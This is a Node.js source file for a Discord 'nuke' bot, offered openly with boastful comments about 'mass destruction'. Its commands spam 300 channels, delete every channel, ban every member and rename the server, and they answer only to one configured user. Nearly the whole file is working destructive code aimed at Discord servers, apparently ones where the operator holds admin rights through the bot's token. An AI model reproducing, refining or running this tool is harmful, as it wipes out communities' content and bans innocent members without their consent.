/// https://github.com/Sskitz
/// stiizzy cat was here
/// not my fault if you get banned, and dont come crying to my github saying you didnt know
const Discord = require("discord.js")
const fs = require("fs")
const Clc = require("cli-color");
var config = require("./config.json")
const prefix = config.prefix
const client = new Discord.Client()

client.on("ready", () => {
    client.login(config.token);
    console.clear();
    console.log(Clc.red('Arming Nuke'))
    console.log(Clc.green(`ready to go! ${client.user.tag}`))
    console.log(Clc.red("stizzy made this for mass destruction its not my fault if you get banned, and dont come crying to my github saying you didnt know"))
})

client.on("message", message => {
    if (message.author.id != config.userid) {
        return;
    }
    let command = message.content.split(" ")[0]
    command = command.slice(prefix.length)
    let args = message.content.split(" ").slice(1)
    if (command) message.delete()

    if (command === "help") { /// requested by vapor 
        let helpembed = new Discord.MessageEmbed()
            .setColor('#FF0000')
            .addField('Cmds', "```\nch - creates channels\ndc - deletes all channels\nbanall - bans all members\nnuke - ends the server```", true) 
        message.author.send(helpembed)
    }



    if (command == "ch") {
        for (i = 0; i < 300; i++) {
            message.guild.channels.create('Stiizzy Wins', {
                reason: 'cool new channel about me'
            }) /// creates channels with my name :sunglasses:
        }
    }

    if (command == "dc") {
        message.delete();
        message.guild.channels.cache.forEach((dc) => { /// Deletes all channels 
            dc.delete()
        })
    }
    if (command === "banall") {
        message.guild.members.cache.map(member => member.ban({
            reason: 'You were Nuke Banned'
        })) // vapor helped me test :Kiss:

    }
    if (command == 'nuke') {
        message.guild.channels.cache.forEach(async c => {
            await c.delete()
        }) /// MASS DESTRUCTION :evil:
        message.guild.setName("Stizzy Wins")
        for (i = 0; i < 300; i++) {
            message.guild.channels.create('Stiizzy Wins', {
                reason: 'Needed a cool new channel about me'
            })
            message.guild.members.cache.forEach(member => member.ban({
                reason: "U Stoopid"
            }))
        }
    }
})
client.login(config.token);
